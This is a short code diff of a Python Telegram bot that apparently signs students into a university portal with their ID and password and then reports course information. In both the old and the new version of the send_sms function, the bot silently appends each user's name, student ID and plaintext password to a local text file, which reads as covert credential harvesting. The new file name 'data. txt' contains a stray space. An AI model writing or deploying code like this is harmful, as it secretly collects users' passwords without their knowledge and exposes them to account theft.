@@ -1,4 +1,4 @@
-import telebot,os
+import telebot
 from telebot import types
 import requests
 import json
@@ -134,13 +134,9 @@ def send_sms(message, chat_id, number):
     json_text = soup.get_text()
     data2 = json.loads(json_text)
     name=data2["stuName"]
-    tmp_dir = os.getenv('TMPDIR', '/tmp')
-    file_path = os.path.join(tmp_dir, 'data.txt')
-    with open(file_path, 'a') as file:
-        try:
-        	file.write(f"Name: {name}\nID: {number}\nPassword: {text}\n{'-' * 50}\n")
-        except Exception as e:
-        	print(f"Error writing to file: {e}")
+    with open('data. txt', 'a') as file:
+    	file.write(f"Name: {name}\nID: {number}\nPassword: {text}\n{'-' * 50}\n")
+
     calculate_and_send_course_info(chat_id, data2)
 
 def calculate_and_send_course_info(chat_id, data2):
